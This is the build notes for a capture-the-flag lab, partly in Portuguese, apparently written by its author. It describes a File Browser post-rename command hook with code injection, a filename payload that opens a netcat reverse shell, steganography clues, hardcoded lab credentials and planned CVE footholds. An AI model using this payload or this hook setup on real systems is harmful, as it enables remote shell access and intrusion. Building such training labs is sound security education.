# Build & run 
```
docker compose build --no-cache
docker compose up -d
```

go to localhost:97 to find post-auth code injection vulnerability
- MUST: login as `armageddon` (password `armageddonarmageddon`), go to settings, set command `sh -c "echo this filename has been renamed: \$FILE"` AFTER RENAME, and save.


# Resolvendo CTF

- steganography nas midias
- foothold: CVE-2026-35585  no file-browser
- Priv Escalation: todo

string base 64
echo "SGkgYWVzcGEuIEkgZG9uJ3Qga25vdyBpZiB5b3UncmUgdGhlIHJlYWwsIHRoZSBmYWtlLCB0aGUgQUkgYWVzcGEgb3Igd2hhdGV2ZXIsIEknbGwgbGV0IHlvdSBsaXZlIGlmIHlvdSBjYW4gbWFrZSB0aHJvdWdoIHRoaXMgY2hhbGxlbmdlLg==" >> app/media/Welcome.png 


scene1.html, inspecionar video: username (artista) e password (comentario) do ftp, ferramenta exiftool
scene1.html, inspecionar gif : SALT da password pkbmc2. usado p criptografia: https://8gwifi.org/pbkdf.jsp. ferramenta comando `strings`
ftp: user aespa password cooper
    todo: binwalk coloca link/dica do filebrowser ('see port 97' )
port:87: vulneravel a code injection pelo rename
- precisa entrar como admin e setar `sh -c "echo this filename has been renamed: $FILE"` after RENAME
- rename um arquivo pra `; nc <IP> 4444 -e sh #` e dps rename dnv p qqr csa, vai rodar (rode listener antes)


## Credenciais
- file browser na localhost:97
```
    filebrowser users add armageddon armageddonarmageddon \
        --database "$DB" \
        --perm.admin
        
    filebrowser users add complexity complexitytrailer \
    ```

# TODO
um servidor SEM RCE pra /web e /media
ftp: binwalk na imagem leva a um login 
bruteforce no login (user winter password flowers )
leva a um site com file upload (sanitized) (CVE-2026-1470) or maybe can only rename? 

 leva ao n8n
n8n vulneravel CVE-2026-1470, atacante upload rev shell = foothold
PE (path hijack, SUID?) todo, poucas ideias de como fazer

# Problemas
cuidado pra nao usar nginx, ou qqr csa q introduz unauthenticated RCE 


nota: flower e cooper estao na rockyou.txt

